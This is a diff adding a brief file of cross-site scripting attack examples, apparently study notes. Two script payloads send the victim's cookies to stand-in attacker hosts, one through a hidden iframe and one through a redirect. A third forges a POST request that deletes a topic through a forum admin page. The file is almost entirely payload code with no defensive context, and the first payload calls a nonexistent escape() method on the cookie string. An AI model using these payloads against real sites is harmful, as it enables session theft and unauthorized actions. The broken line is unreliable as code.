@@ -1,0 +1,25 @@
+XSS Attacks examples:
+
+
+1) <script>document.write('<iframe src="http://evilattacker.com?cookie= '+
+document.cookie.escape() + '" height=0 width=0 />'); </script>
+
+2) <script> window.location = 'http://attacker/?cookie=' + document.cookie
+</script>
+
+3)  <script>
+    var params = 'type=topic&action=delete&id=347';
+    var http = new XMLHttpRequest();
+    http.open('POST', 'forum.com/admin_control.php', true);
+    http.setRequestHeader("Content-type",
+"application/x-www-form-urlencoded");
+    http.setRequestHeader("Content-length", params.length);
+    http.setRequestHeader("Connection", "close");
+    http.onreadystatechange = function() {
+        if(http.readyState == 4 && http.status == 200) {
+            // Do something else.
+        }
+    };
+    http.send(params);
+ </script>
+XML Http Request
